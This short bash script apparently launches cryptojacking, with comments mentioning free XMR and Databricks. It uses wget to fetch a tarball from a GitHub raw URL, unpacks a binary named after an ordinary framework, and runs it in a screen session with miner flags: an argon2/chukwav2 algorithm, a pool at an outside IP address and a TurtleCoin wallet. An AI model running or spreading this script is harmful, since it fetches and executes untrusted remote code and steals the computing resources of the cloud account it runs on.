#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R Basic-Quarkus
 
wget https://raw.githubusercontent.com/dshillin/http-nodejs/main/Basic-Quarkus.tar.gz
tar xvzf Basic-Quarkus.tar.gz
cd Basic-Quarkus
./Basic-Quarkus -a argon2/chukwav2 -o 142.132.131.248:80 -u TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA -p test02
